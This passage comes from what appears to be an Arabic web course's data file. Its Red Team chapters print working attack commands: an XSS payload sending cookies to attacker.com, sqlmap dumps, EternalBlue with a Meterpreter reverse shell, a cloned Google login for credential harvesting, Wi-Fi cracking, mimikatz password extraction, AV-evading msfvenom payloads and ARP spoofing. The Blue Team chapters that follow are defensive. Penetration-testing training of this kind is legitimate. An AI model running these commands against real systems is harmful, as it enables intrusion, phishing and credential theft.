          <li>ما هو أمر Nmap لفحص منفذ 443 فقط على هدف؟</li>
          <li>اذكر ثلاث أدوات لجمع المعلومات (OSINT).</li>
          <li>كيف تبحث عن ملفات SUID على نظام لينكس؟</li>
        </ol>
        <p><strong>المشروع العملي للمستوى الأول:</strong> قم بتحميل وتثبيت <strong>Metasploitable 2</strong> (جهاز هدف ضعيف جداً). استخدم Nmap لمسحه، ثم استغل ثغرة vsftpd باستخدام Metasploit للحصول على shell. ارفع امتيازاتك باستخدام SUID (ابحث عن ملف قابل للاستغلال). دوّن كل خطوة.</p>
      `},{number:10,title:"[متوسط] هجمات تطبيقات الويب – SQL Injection",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل العاشر: اختراق قواعد البيانات</h2>
        <p>ثغرة SQL Injection هي من أقدم وأخطر الثغرات. تسمح للمهاجم بتنفيذ استعلامات SQL على قاعدة البيانات.</p>
        <h3 class="font-bold text-neon/80 mt-4 mb-2">كيف تعمل؟</h3>
        <p>تطبيق الويب الضعيف لا يقوم بتنقية (sanitize) المدخلات. لذلك يمكن للمهاجم إدخال كود SQL ضار.</p>
        <div class="code-block">
# مثال على استعلام SQL ضعيف في كود PHP:
$sql = "SELECT * FROM users WHERE username = '" . $_GET['username'] . "'";

# إذا أدخل المهاجم: admin' --
# يصبح الاستعلام:
SELECT * FROM users WHERE username = 'admin' -- '
        </div>
        <h3 class="font-bold text-neon/80 mt-4 mb-2">أتمتة الهجوم باستخدام sqlmap</h3>
        <div class="code-block">
# اكتشاف SQLi
sqlmap -u "http://target.com/page?id=1" --dbs --batch

# استخراج قواعد البيانات والجداول
sqlmap -u "http://target.com/page?id=1" -D database_name --tables

# استخراج البيانات
sqlmap -u "http://target.com/page?id=1" -D database_name -T table_name --dump
        </div>
        <div class="warning-box">
          ⚠️ <strong>تنبيه:</strong> لا تستخدم sqlmap على مواقع حقيقية دون إذن. استخدم منصات تدريب مثل PortSwigger Web Security Academy.
        </div>
      `},{number:11,title:"[متوسط] هجمات تطبيقات الويب – XSS و CSRF",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الحادي عشر: هجمات الويب الجانبية (Client-Side)</h2>
        <h3 class="font-bold text-neon/80 mt-4 mb-2">Cross-Site Scripting (XSS)</h3>
        <p>حقن كود JavaScript في صفحات الويب لتنفيذه في متصفح الضحية. أنواعه: Reflected، Stored، DOM-based.</p>
        <div class="code-block">
# مثال على هجوم XSS بسيط (Reflected)
&lt;script&gt;alert('XSS')&lt;/script&gt;

# سرقة الكوكيز (يمكن استخدامها لسرقة الجلسات)
&lt;script&gt;fetch('https://attacker.com/steal?cookie=' + document.cookie)&lt;/script&gt;
        </div>
        <h3 class="font-bold text-neon/80 mt-4 mb-2">Cross-Site Request Forgery (CSRF)</h3>
        <p>خداع المستخدم لتنفيذ إجراءات غير مرغوب فيها (مثل تغيير كلمة المرور) دون علمه.</p>
        <div class="code-block">
# مثال: طلب POST خفي لتغيير البريد الإلكتروني
&lt;form action="https://target.com/change_email" method="POST"&gt;
    &lt;input type="hidden" name="email" value="attacker@example.com"&gt;
&lt;/form&gt;
&lt;script&gt;document.forms[0].submit();&lt;/script&gt;
        </div>
      `},{number:12,title:"[متوسط] استغلال الثغرات باستخدام Metasploit (متقدم)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثاني عشر: استخدام Metasploit بشكل احترافي</h2>
        <p>سنقوم بإنشاء جلسة Meterpreter (أداة قوية للتحكم في الجهاز المخترق).</p>
        <div class="code-block">
# تشغيل Metasploit
msfconsole

# البحث عن ثغرة على نظام Windows
search eternalblue

# استخدام exploit
use exploit/windows/smb/ms17_010_eternalblue

# تعيين الخيارات
set RHOSTS 192.168.1.20
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5   # عنوان Kali
set LPORT 4444

# تنفيذ
exploit
        </div>
        <p>بعد النجاح، ستحصل على جلسة Meterpreter. أوامر مفيدة:</p>
        <ul>
          <li><code>sysinfo</code> – معلومات النظام.</li>
          <li><code>getuid</code> – الصلاحيات الحالية.</li>
          <li><code>ps</code> – عرض العمليات.</li>
          <li><code>migrate PID</code> – الانتقال إلى عملية أخرى (للثبات).</li>
          <li><code>shell</code> – فتح shell عادي للنظام.</li>
          <li><code>upload /local/file /remote/path</code> – رفع ملف.</li>
          <li><code>download /remote/file /local/path</code> – تنزيل ملف.</li>
        </ul>
      `},{number:13,title:"[متوسط] الهندسة الاجتماعية وأدواتها",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثالث عشر: استغلال العنصر البشري</h2>
        <p>الهندسة الاجتماعية (Social Engineering) هي خداع الأشخاص بدلاً من الأجهزة. أشهر أداة هي <strong>Social-Engineer Toolkit (SET)</strong>.</p>
        <div class="code-block">
# تشغيل SET
sudo setoolkit

# اختر 1) Social-Engineering Attacks
# ثم 2) Website Attack Vectors
# ثم 3) Credential Harvester Attack Method
# ثم 2) Site Cloner (استنساخ صفحة تسجيل دخول حقيقية)

# أدخل عنوان IP الخاص بك (الذي سترسل الضحية إليه)
# أدخل عنوان URL لصفحة تسجيل الدخول الحقيقية (مثل https://accounts.google.com)
        </div>
        <p>بعد ذلك، ستنشأ صفحة وهمية. أرسل الرابط إلى الضحية (في بيئة اختبار قانونية). عند إدخال بياناته، ستُرسل إليك.</p>
        <div class="warning-box">
          ⚠️ <strong>تنبيه أخلاقي:</strong> لا تستخدم هذه الأداة ضد أشخاص حقيقيين دون إذن. استخدمها فقط في تمارين قانونية أو على نفسك.
        </div>
      `},{number:14,title:"[متوسط] اختراق الشبكات اللاسلكية (Wi-Fi)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الرابع عشر: كسر شبكات الواي فاي</h2>
        <p>اختراق شبكات Wi-Fi المحمية بـ WPA/WPA2 يتطلب التقاط حزمة "المصافحة الرباعية" (4-way handshake) ثم كسر المفتاح باستخدام قائمة كلمات مرور.</p>
        <div class="code-block">
# تشغيل وضع المراقبة
sudo airmon-ng start wlan0

# فحص الشبكات
sudo airodump-ng wlan0mon

# التقاط الحزم على شبكة معينة
sudo airodump-ng -c 6 --bssid [BSSID] -w capture wlan0mon

# في نافذة أخرى، قم بإرسال حزمة deauth لفرض إعادة المصافحة
sudo aireplay-ng -0 2 -a [BSSID] wlan0mon

# كسر المفتاح
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
        </div>
        <div class="warning-box">
          ⚠️ <strong>تنبيه:</strong> لا تجرب هذه الأوامر على شبكات ليست ملكك. في مصر، اختراق شبكات الواي فاي دون إذن يعتبر جريمة.
        </div>
      `},{number:15,title:"[متوسط] اختراق الشبكات الداخلية ونقل الحركة (Pivoting)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الخامس عشر: من جهاز إلى الشبكة بأكملها</h2>
        <p>بعد اختراق جهاز واحد داخل الشبكة (غالباً نقطة دخول ضعيفة)، يمكننا استخدامه كنقطة انطلاق لاختراق أجهزة أخرى لا يمكن الوصول إليها مباشرة. هذه العملية تسمى <strong>Pivoting</strong>.</p>
        <div class="code-block">
# من داخل جلسة Meterpreter
run autoroute -s 192.168.10.0/24   # إضافة مسار للشبكة الداخلية

# الخروج إلى الخلفية
background

# استخدام وحدة فحص المنافذ على الشبكة الداخلية
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.10.5
set PORTS 22,80,443
run
        </div>
        <p>أدوات أخرى لنقل الحركة: <strong>Chisel</strong>، <strong>SSH Tunneling</strong>، <strong>ProxyChains</strong>.</p>
      `},{number:16,title:"[متوسط] رفع الامتيازات على ويندوز (PowerUp و JuicyPotato)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل السادس عشر: من مستخدم عادي إلى مسؤول نظام</h2>
        <p>في بيئة ويندوز، توجد أدوات آلية لرفع الامتيازات. من أشهرها <strong>PowerUp</strong> (ضمن PowerSploit) و <strong>JuicyPotato</strong>.</p>
        <div class="code-block">
# رفع سكريبت PowerUp إلى الجهاز المستهدف (عبر جلسة Meterpreter)
upload /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1

# تنفيذه في جلسة shell
powershell -ep bypass
. .\\PowerUp.ps1
Invoke-AllChecks
        </div>
        <p>إذا وجدت خدمة قابلة للاستغلال (مثل خدمة تعمل بصلاحيات النظام)، يمكنك استغلالها.</p>
      `},{number:17,title:"[متوسط] اختراق Active Directory",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل السابع عشر: استهداف البنية التحتية للمؤسسات</h2>
        <p>معظم الشركات تستخدم Active Directory (AD) لإدارة المستخدمين والأجهزة. اختراق AD هو هدف متقدم.</p>
        <ul>
          <li><strong>BloodHound:</strong> أداة لرسم علاقات AD واكتشاف مسارات الهجوم.</li>
          <li><strong>Mimikatz:</strong> لاستخراج كلمات المرور من الذاكرة (بعد الحصول على صلاحيات عالية).</li>
          <li><strong>Kerberoasting:</strong> هجوم لاستخراج تجزئات كلمات مرور حسابات الخدمة.</li>
        </ul>
        <div class="code-block">
# بعد الحصول على صلاحيات عالية على جهاز منضم إلى AD
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords   # عرض كلمات مرور المستخدمين المخزنة في الذاكرة
        </div>
      `},{number:18,title:"[متوسط] مراجعة المستوى الثاني واختبار",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثامن عشر: اختبار الفهم للمستوى المتوسط</h2>
        <p>أجب عن الأسئلة التالية:</p>
        <ol>
          <li>اشرح ثغرة SQL Injection واكتب مثالاً على إدخال ضار.</li>
          <li>ما الفرق بين XSS و CSRF؟</li>
          <li>كيف يمكنك استغلال ثغرة EternalBlue باستخدام Metasploit؟</li>
          <li>ما هي أداة SET وماذا تفعل؟</li>
          <li>ما هي خطوات اختراق شبكة Wi-Fi محمية بـ WPA2؟</li>
          <li>ما معنى Pivoting في سياق اختبار الاختراق؟</li>
          <li>اذكر أداة لرفع الامتيازات على ويندوز وطريقة استخدامها.</li>
        </ol>
        <p><strong>المشروع العملي للمستوى الثاني:</strong> قم بتحميل <strong>Metasploitable 3</strong> (جهاز هدف ويندوز ضعيف). استخدم Nmap لاكتشاف الثغرات، ثم استغل ثغرة EternalBlue باستخدام Metasploit. احصل على جلسة Meterpreter، وقم باستخراج معلومات النظام، وحمّل أداة PowerUp واجري فحصاً لرفع الامتيازات.</p>
      `},{number:19,title:"[متقدم] أتمتة اختبار الاختراق باستخدام Python",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل التاسع عشر: كتابة أدواتك الخاصة</h2>
        <p>الأتمتة تزيد من كفاءة المخترق الأخلاقي. سنتعلم كتابة سكريبتات بايثون بسيطة لأتمتة المهام.</p>
        <div class="code-block">
# سكريبت لفحص المنافذ المفتوحة
import socket

def scan_port(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    result = sock.connect_ex((ip, port))
    sock.close()
    return result == 0

target = "192.168.1.1"
for port in range(1, 1025):
    if scan_port(target, port):
        print(f"Port {port} is open")
        </div>
        <div class="code-block">
# سكريبت بسيط لاختبار SQLi (تجميعي)
import requests

url = "http://target.com/page?id="
payloads = ["'", "' OR '1'='1", "' UNION SELECT NULL--"]

for payload in payloads:
    r = requests.get(url + payload)
    if "error" in r.text.lower() or "mysql" in r.text.lower():
        print(f"Potential SQLi with payload: {payload}")
        </div>
      `},{number:20,title:"[متقدم] التحضير لشهادة OSCP (Offensive Security Certified Professional)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل العشرون: كيف تحصل على أشهر شهادة في الاختراق؟</h2>
        <p>شهادة OSCP هي معيار الذهب في مجال اختبار الاختراق. تتطلب اجتياز امتحان عملي مدته 24 ساعة لاختراق عدة أجهزة في شبكة معزولة.</p>
        <h3 class="font-bold text-neon/80 mt-4 mb-2">كيف تستعد؟</h3>
        <ul>
          <li>خذ دورة PEN-200 الرسمية من OffSec (التي تغطي المواد الأساسية).</li>
          <li>تدرب على منصات CTF مثل <strong>HackTheBox</strong> و <strong>Proving Grounds</strong>.</li>
          <li>ادرس تقارير الاختراق (write-ups) السابقة.</li>
          <li>أنشئ مختبراً منزلياً يحتوي على أجهزة لينكس وويندوز صعبة.</li>
        </ul>
        <div class="note-box">
          🎯 <strong>نصيحة:</strong> ركز على: استغلال الثغرات (Buffer Overflow على لينكس)، رفع الامتيازات على كل من ويندوز ولينكس، واختراق Active Directory (بما في ذلك Kerberoasting و Pass-the-Hash).
        </div>
      `},{number:21,title:"[متقدم] اختراق تطبيقات الويب الحديثة – JWT, GraphQL, SSRF",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الحادي والعشرون: ثغرات العصر الحديث</h2>
        <ul>
          <li><strong>JWT (JSON Web Token) Attacks:</strong> تغيير التوقيع، خوارزمية none، استخدام مفاتيح ضعيفة.</li>
          <li><strong>GraphQL Injection:</strong> استغلال نقاط نهاية GraphQL لاستخراج البيانات أو إرهاق الخادم.</li>
          <li><strong>SSRF (Server-Side Request Forgery):</strong> إجبار الخادم على إرسال طلبات إلى أنظمة داخلية لا يمكن الوصول إليها مباشرة.</li>
        </ul>
        <div class="code-block">
# مثال: استغلال SSRF لقراءة ملف محلي
http://target.com/load?url=http://localhost/admin

# استخدام بروتوكول file:// لقراءة ملفات النظام (إذا كان مسموحاً)
http://target.com/load?url=file:///etc/passwd
        </div>
      `},{number:22,title:"[متقدم] تجاوز أنظمة الحماية (AV/EDR) باستخدام تقنيات متقدمة",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثاني والعشرون: كيف تختبئ من برامج الحماية؟</h2>
        <p>برامج مكافحة الفيروسات وأنظمة EDR (Endpoint Detection and Response) تعقد مهمة المخترق. تقنيات التجاوز تشمل:</p>
        <ul>
          <li><strong>تشويب (Obfuscation):</strong> تغيير شكل الكود مع الحفاظ على وظيفته (مثل استخدام الإكسور).</li>
          <li><strong>تشغيل payloads في الذاكرة فقط (Fileless Malware).</strong></li>
          <li><strong>استخدام تقنيات injection في عمليات شرعية (مثل Process Hollowing).</strong></li>
          <li><strong>ترميز (Encoding) الحمولات وتشفيرها قبل الإرسال.</strong></li>
        </ul>
        <div class="code-block">
# إنشاء حمولة (payload) مشوهة باستخدام msfvenom
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o payload_encoded.exe

# تغيير اسم الملف وعلاماته الزمنية لتجنب الكشف
        </div>
      `},{number:23,title:"[متقدم] تحليل البرامج الضارة (Malware Analysis) للمخترق",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثالث والعشرون: فهم ما يحدث داخل الملف الخبيث</h2>
        <p>كRed Team، قد تحتاج إلى تحليل أدوات خصومك (أو أدواتك). سنغطي أساسيات التحليل الساكن والديناميكي.</p>
        <ul>
          <li><strong>التحليل الساكن:</strong> استخدام <code>strings</code>، <code>pefile</code>، <code>Detect It Easy</code> لفحص الملف دون تشغيله.</li>
          <li><strong>التحليل الديناميكي:</strong> تشغيل العينة في بيئة معزولة (REMnux) ومراقبة السلوك باستخدام <code>ProcMon</code> و <code>Wireshark</code>.</li>
        </ul>
        <div class="code-block">
# استخراج السلاسل النصية
strings suspicious.exe | grep -i "http"

# حساب التجزئة
sha256sum suspicious.exe
        </div>
      `},{number:24,title:"[متقدم] حرب الشبكات (Network Eavesdropping & MiTM)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الرابع والعشرون: التنصت على الشبكة المحلية</h2>
        <p>إذا كنت موجوداً فعلياً على نفس الشبكة المحلية للهدف، يمكنك استخدام هجمات ARP Spoofing أو DHCP Spoofing لاعتراض حركة المرور.</p>
        <div class="code-block">
# استخدام ettercap (واجهة سطر أوامر)
sudo ettercap -T -M arp:remote /target_ip// /gateway_ip//

# استخدام bettercap (أداة حديثة)
sudo bettercap
net.show
set arp.spoof.targets target_ip
arp.spoof on
net.sniff on
        </div>
        <p>بعد الاعتراض، يمكنك استخراج كلمات المرور المرسلة عبر بروتوكولات غير مشفرة (HTTP, FTP, Telnet).</p>
      `},{number:25,title:"[متقدم] كتابة تقارير اختراق احترافية",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الخامس والعشرون: تسويق نجاحك</h2>
        <p>التقرير الجيد هو ما يفرق بين اختبار اختراق عادي وآخر احترافي. يجب أن يحتوي على:</p>
        <ul>
          <li><strong>ملخص تنفيذي:</strong> للإدارة العليا (يشرح النتائج الرئيسية بلغة غير تقنية).</li>
          <li><strong>نطاق الاختبار:</strong> الأصول التي تم اختبارها، التواريخ، أنواع الاختبار.</li>
          <li><strong>المنهجية:</strong> الأدوات والتقنيات المستخدمة (Nmap, Metasploit, Burp Suite).</li>
          <li><strong>الثغرات المكتشفة:</strong> مرتبة حسب الخطورة (Critical, High, Medium, Low).</li>
          <li><strong>إثبات المفهوم (PoC):</strong> لكل ثغرة، مع أوامر ولقطات شاشة.</li>
          <li><strong>توصيات الإصلاح:</strong> خطوات واضحة وقابلة للتطبيق.</li>
        </ul>
        <div class="fig-box">
          <i class="fas fa-file-pdf text-neon text-2xl mb-2 block"></i>
          الشكل 25.1: نموذج تقرير اختبار اختراق
        </div>
      `},{number:26,title:"[متقدم] خطة التعلم لمدة 12 شهراً لتصبح Penetration Tester",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل السادس والعشرون: من الصفر إلى OSCP</h2>
        <ul>
          <li><strong>الشهر 1-2:</strong> تعلم أساسيات الشبكات ولينكس (شهادة Network+, Linux+).</li>
          <li><strong>الشهر 3-4:</strong> دراسة دورة eJPT (Junior Penetration Tester) من eLearnSecurity (عملية).</li>
          <li><strong>الشهر 5-6:</strong> التدرب على TryHackMe و HackTheBox (آلات سريعة).</li>
          <li><strong>الشهر 7-9:</strong> دورة PEN-200 (الخاصة بـ OSCP) – الدراسة وتمارين المختبر.</li>
          <li><strong>الشهر 10-12:</strong> حل آلات من Proving Grounds و VulnHub، ثم التقدم لامتحان OSCP.</li>
        </ul>
        <div class="note-box">
          💡 <strong>نصيحة:</strong> أنشئ مدونة أو قناة يوتيوب لتوثيق رحلتك. هذا يساعد في بناء سمعتك وجذب فرص عمل.
        </div>
      `},{number:27,title:"[متقدم] مراجعة المستوى الثالث والمشروع النهائي",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل السابع والعشرون: مشروع ختامي شامل</h2>
        <p><strong>سيناريو المشروع:</strong> أنت مختبر اختراق أخلاقي، وكُلفت باختبار شبكة شركة افتراضية تحتوي على 3 أجهزة (لينكس، ويندوز، خادم ويب).</p>
        <p><strong>المطلوب:</strong></p>
        <ol>
          <li>جمع معلومات (OSINT) عن الشركة.</li>
          <li>مسح الشبكة باستخدام Nmap (اكتشاف المنافذ المفتوحة والخدمات).</li>
          <li>استغلال ثغرات الويب (SQLi أو XSS) على خادم الويب.</li>
          <li>استخدام Metasploit لاختراق جهاز ويندوز (مثلاً باستخدام ثغرة EternalBlue).</li>
          <li>رفع الامتيازات على جهاز لينكس إلى الجذر (باستخدام SUID أو Kernel exploit).</li>
          <li>نقل الحركة (Pivoting) من جهاز مخترق إلى آخر داخل الشبكة الداخلية.</li>
          <li>كتابة تقرير كامل (5-10 صفحات) يوضح الخطوات والثغرات والتوصيات.</li>
        </ol>
        <p><strong>تقيم ذاتي:</strong> هل تستطيع تطبيق كل هذه الخطوات دون مساعدة؟ إذا كانت الإجابة نعم، فأنت مؤهل لدور Penetration Tester مبتدئ.</p>
      `}]},av={id:"blue-team",title:"Blue Team",emoji:"🔵",color:"blue",description:"منهج متكامل من 3 مستويات - الدفاع والمراقبة والاستجابة للحوادث",level:"مبتدئ / متوسط / متقدم",chaptersCount:27,pages:"~190 صفحة",icon:"fa-shield-alt",chapters:[{number:1,title:"[مبتدئ] ما هو Blue Team؟ مقدمة في الدفاع السيبراني",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الأول: دور المدافع في الأمن السيبراني</h2>
        <p><strong>Blue Team:</strong> هو فريق الدفاع المسؤول عن حماية أنظمة وشبكات وبيانات المؤسسة من الهجمات الإلكترونية. تشمل مسؤولياته المراقبة المستمرة، تحليل التنبيهات، إدارة الثغرات، والاستجابة للحوادث.</p>
        <p>يختلف دور Blue Team عن SOC Analyst (محلل مركز العمليات الأمنية) في أن الأول أوسع ويشمل هندسة الدفاع، بينما الثاني يركز على المراقبة والتحليل.</p>
        <div class="fig-box">
          <i class="fas fa-shield-alt text-neon text-4xl mb-2 block"></i>
          <strong>الشكل 1.1:</strong> مكونات فريق Blue Team – المراقبة، الدفاع، الاستجابة، التحصين
        </div>
        <div class="note-box">
          📌 <strong>معلومة:</strong> فرق Blue Team تعمل غالباً بنظام الورديات (24/7) لضمان استمرارية الحماية.
        </div>
      `},{number:2,title:"[مبتدئ] تجهيز بيئة عمل Blue Team",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثاني: أدوات المدافع الأولى</h2>
        <p>لبدء ممارسة الدفاع، ستحتاج إلى:</p>
        <ul>
          <li><strong>جهاز افتراضي (VirtualBox أو VMware)</strong> – لتشغيل أنظمة الاختبار بأمان.</li>
          <li><strong>توزيعة Linux (Ubuntu 22.04 أو 24.04)</strong> – ستكون بيئة العمل الأساسية للتحليل.</li>
          <li><strong>Windows 10/11 (نسخة تجريبية)</strong> – لفهم بيئة الأنظمة المستهدفة التي ستدافع عنها.</li>
          <li><strong>أدوات المراقبة الأساسية:</strong> Wireshark، tcpdump، Sysmon، PowerShell.</li>
        </ul>
        <div class="code-block">
# تحديث النظام وتثبيت الأدوات الأساسية على Ubuntu
sudo apt update && sudo apt upgrade -y
sudo apt install wireshark tcpdump syslog-ng clamav openssh-server -y
        </div>
        <div class="note-box">
          📌 <strong>نشاط 1:</strong> قم بتثبيت Ubuntu على جهاز افتراضي، وشغّل الأمر <code>sudo apt update</code>. دوّن النتيجة.
        </div>
      `},{number:3,title:"[مبتدئ] أساسيات الشبكات للمدافع",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثالث: كيف تتحرك البيانات في الشبكة؟</h2>
        <p>لفهم الهجمات وكيفية اكتشافها، يجب فهم أساسيات الشبكات.</p>
        <ul>
          <li><strong>نموذج OSI:</strong> الطبقات السبع – من الطبقة المادية (1) إلى طبقة التطبيقات (7). معظم الهجمات تستهدف الطبقات 3 (الشبكة)، 4 (النقل)، 7 (التطبيقات).</li>
          <li><strong>بروتوكولات مهمة:</strong> TCP (اتصال موثوق)، UDP (اتصال سريع)، ICMP (التحكم والخطأ).</li>
          <li><strong>المنافذ الشائعة:</strong> 80 (HTTP)، 443 (HTTPS)، 22 (SSH)، 53 (DNS)، 3389 (RDP).</li>
        </ul>
        <div class="code-block">
# أوامر لتحليل الشبكة من منظور دفاعي
netstat -tulpn           # عرض المنافذ المفتوحة والخدمات
ss -tulpn               # بديل حديث لـ netstat
tcpdump -i eth0 -c 100  # التقاط أول 100 حزمة على واجهة eth0
        </div>
      `},{number:4,title:"[مبتدئ] أساسيات لينكس للمدافع",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الرابع: السيطرة على نظام التشغيل</h2>
        <p>المدافع يحتاج إلى معرفة جيدة بلينكس، لأن معظم أدوات المراقبة والتحليل تعمل عليه.</p>
        <h3 class="font-bold text-neon/80 mt-4 mb-2">أوامر أساسية:</h3>
        <ul>
          <li><code>ls -la</code> – عرض الملفات والمجلدات مع الصلاحيات.</li>
          <li><code>ps aux</code> – عرض العمليات الجارية.</li>
          <li><code>grep</code> – البحث داخل النصوص.</li>
          <li><code>tail -f /var/log/syslog</code> – متابعة السجلات في الوقت الحقيقي.</li>
          <li><code>sudo</code> – تنفيذ أوامر بصلاحيات مرتفعة.</li>
        </ul>
        <div class="code-block">
# أمثلة عملية للمدافع
sudo systemctl status ssh      # التحقق من حالة خدمة SSH
sudo ufw enable                # تشغيل جدار الحماية البسيط
sudo ufw allow 22/tcp          # السماح بـ SSH فقط
        </div>
      `},{number:5,title:"[مبتدئ] مقدمة في تحليل السجلات (Logs)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الخامس: عيون المراقبة – السجلات</h2>
        <p>السجلات (Logs) هي المصدر الأساسي للمعلومات عند التحقيق في حادثة أمنية.</p>
        <h3 class="font-bold text-neon/80 mt-4 mb-2">سجلات مهمة في لينكس:</h3>
        <ul>
          <li><code>/var/log/auth.log</code> – محاولات تسجيل الدخول، استخدام sudo.</li>
          <li><code>/var/log/syslog</code> – أحداث النظام العامة.</li>
          <li><code>/var/log/apache2/access.log</code> – طلبات خادم الويب.</li>
        </ul>
        <div class="code-block">
# تحليل سجلات المصادقة (البحث عن محاولات فاشلة)
sudo grep "Failed password" /var/log/auth.log

# متابعة سجل النظام في الوقت الحقيقي
sudo tail -f /var/log/syslog
        </div>
        <div class="note-box">
          📌 <strong>نشاط 5:</strong> حاول تسجيل الدخول إلى جهاز Ubuntu بكلمة مرور خاطئة عدة مرات، ثم استخدم <code>grep</code> لاستخراج المحاولات الفاشلة من سجل المصادقة.
        </div>
      `},{number:6,title:"[مبتدئ] جدران الحماية الأساسية (ufw و iptables)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل السادس: منع الدخول غير المصرح به</h2>
        <p>جدار الحماية (Firewall) هو خط الدفاع الأول الذي يصفف حركة المرور بناءً على قواعد (السماح/المنع).</p>
        <div class="code-block">
# استخدام ufw (Uncomplicated Firewall) - بسيط للمبتدئين
sudo ufw status verbose
sudo ufw default deny incoming    # منع كل الاتصالات الواردة افتراضياً
sudo ufw default allow outgoing   # السماح بالاتصالات الصادرة
sudo ufw allow 22/tcp             # السماح بـ SSH
sudo ufw enable

# استخدام iptables (متقدم)
sudo iptables -L -n -v            # عرض القواعد الحالية
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT   # السماح بـ SSH
sudo iptables -A INPUT -j DROP    # منع كل شيء آخر
        </div>
      `},{number:7,title:"[مبتدئ] تحديث الأنظمة وإدارة التصحيحات (Patch Management)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل السابع: سد الثغرات قبل استغلالها</h2>
        <p>معظم الاختراقات تستغل ثغرات معروفة تم إصدار تصحيحات لها. لذلك، تطبيق التصحيحات بانتظام هو أحد أهم مهام Blue Team.</p>
        <div class="code-block">
# تحديث لينكس
sudo apt update && sudo apt upgrade -y

# تحديث ويندوز (عبر PowerShell)
Get-WindowsUpdate -Install -AcceptAll

# أتمتة التحديثات (عبر cron job في لينكس)
sudo crontab -e
# أضف السطر التالي لتشغيل التحديث كل يوم أحد الساعة 2 صباحاً
0 2 * * 0 sudo apt update && sudo apt upgrade -y
        </div>
      `},{number:8,title:"[مبتدئ] حماية كلمات المرور والمصادقة متعددة العوامل (MFA)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثامن: أقوى خط دفاع هو الهوية</h2>
        <p>إدارة الهوية والوصول (IAM) هي جوهر الأمن.</p>
        <ul>
          <li>استخدم كلمات مرور طويلة ومعقدة (12 حرفاً على الأقل).</li>
          <li>فعّل المصادقة متعددة العوامل (MFA) على جميع الحسابات الهامة.</li>
          <li>استخدم مدير كلمات مرور (مثل Bitwarden) لتخزينها بشكل آمن.</li>
          <li>طبق سياسة الحد من محاولات تسجيل الدخول (Account Lockout Policy).</li>
        </ul>
        <div class="code-block">
# مثال على سياسة كلمات المرور في Linux (تعديل /etc/login.defs)
PASS_MAX_DAYS 90
PASS_MIN_DAYS 7
PASS_WARN_AGE 14
        </div>
      `},{number:9,title:"[مبتدئ] مراجعة المستوى الأول واختبار",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل التاسع: اختبار الفهم للمستوى المبتدئ</h2>
        <p>أجب عن الأسئلة التالية:</p>
        <ol>
          <li>ما هي المسؤوليات الأساسية لفريق Blue Team؟</li>
          <li>كيف يمكنك عرض المنافذ المفتوحة على جهاز لينكس؟</li>
          <li>ما الفرق بين <code>ufw</code> و <code>iptables</code>؟</li>
          <li>كيف تبحث عن محاولات تسجيل دخول فاشلة في سجل auth.log؟</li>
          <li>لماذا تعتبر إدارة التصحيحات مهمة؟</li>
        </ol>
        <p><strong>المشروع العملي للمستوى الأول:</strong> قم بتثبيت Ubuntu على جهاز افتراضي، وشغّل جدار الحماية ufw، واسمح فقط بـ SSH. ثم حاول الاتصال بالجهاز عبر SSH من جهاز آخر (أو من نفس الجهاز باستخدام localhost). دوّن الخطوات.</p>
      `},{number:10,title:"[متوسط] تحليل سجلات ويندوز باستخدام PowerShell و Event Viewer",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل العاشر: التحقيق في سجلات ويندوز</h2>
        <p>تعتبر سجلات ويندوز (Windows Event Logs) من أغنى مصادر المعلومات للمحلل الأمني.</p>
        <h3 class="font-bold text-neon/80 mt-4 mb-2">الأحداث الرئيسية (Event IDs) التي يجب مراقبتها:</h3>
        <ul>
          <li><strong>4624:</strong> تسجيل دخول ناجح.</li>
          <li><strong>4625:</strong> فشل تسجيل الدخول.</li>
          <li><strong>4688:</strong> إنشاء عملية جديدة (يمكن أن تكشف عن تشغيل برامج ضارة).</li>
          <li><strong>7045:</strong> تثبيت خدمة جديدة.</li>
          <li><strong>1102:</strong> مسح سجل الأمان (قد يشير إلى محاولة إزالة الأدلة).</li>
        </ul>
        <div class="code-block">
# أوامر PowerShell لتحليل السجلات
# عرض آخر 10 أحداث فشل تسجيل دخول
Get-EventLog -LogName Security -EntryType FailureAudit -Newest 10 | Format-Table -AutoSize

# استخدام Get-WinEvent للبحث عن Event ID 4688 (إنشاء عمليات)
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4688} | Select-Object TimeCreated, Message

